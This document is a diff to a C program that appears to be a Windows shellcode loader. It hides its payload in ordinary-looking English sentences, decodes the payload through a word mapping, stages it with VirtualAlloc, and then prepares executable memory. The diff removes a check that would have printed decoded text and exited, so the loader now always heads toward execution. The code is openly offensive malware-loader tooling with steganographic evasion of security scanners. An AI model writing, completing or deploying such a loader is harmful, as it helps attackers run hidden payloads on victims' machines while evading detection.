@@ -243,14 +243,6 @@ static size_t decrypt_shellcode(const char* text, unsigned char** output, int ve
     return out_pos;
 }
 
-static int is_printable_text(const unsigned char* data, size_t length) {
-    for (size_t i = 0; i < length; ++i) {
-        unsigned char c = data[i];
-        if (c == '\n' || c == '\r' || c == '\t') continue;
-        if (!isprint(c)) return 0;
-    }
-    return 1;
-}
 
 static void wait_for_enter(const char* prompt) {
     if (prompt && prompt[0]) printf("%s", prompt);
@@ -299,7 +291,7 @@ static const char* ciphertext =
 "\n"
 " Nonetheless, than its namely waters otherwise three bucket, coming people initially my rowboat, otherwise year indirectly we. Something bottle packed, partly woke stone say, elsewhere this because. Leather one orange, leather up purple, partly an purple, bottle.";
 
-int main(void) 
+int main(void)
 {
 
     if (!init_word_mapping(secret_sentence, password)) {
@@ -309,7 +301,7 @@ int main(void)
 
     wait_for_enter("Press <Enter> to allocate ciphertext buffer...\n");
 
-    void* ciphertext_buf = VirtualAlloc(0, strlen(ciphertext) + 1 , MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    void* ciphertext_buf = VirtualAlloc(0, strlen(ciphertext) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
     if (!ciphertext_buf) {
         fprintf(stderr, "Failed to allocate ciphertext buffer.\n");
@@ -335,12 +327,6 @@ int main(void)
     printf("[+] Decoded %llu bytes (codewords=%d, noise_skipped=%d).\n\n",
         (unsigned long long)decoded_len, stats.codewords, stats.noise_skipped);
 
-    if (is_printable_text(decoded, decoded_len)) {
-        wait_for_enter("Press <Enter> to display decoded text...\n");
-        printf("Decoded text:\n%.*s\n", (int)decoded_len, decoded);
-        free(decoded);
-        return EXIT_SUCCESS;
-    }
 
     wait_for_enter("Press <Enter> to allocate executable memory...\n");
 
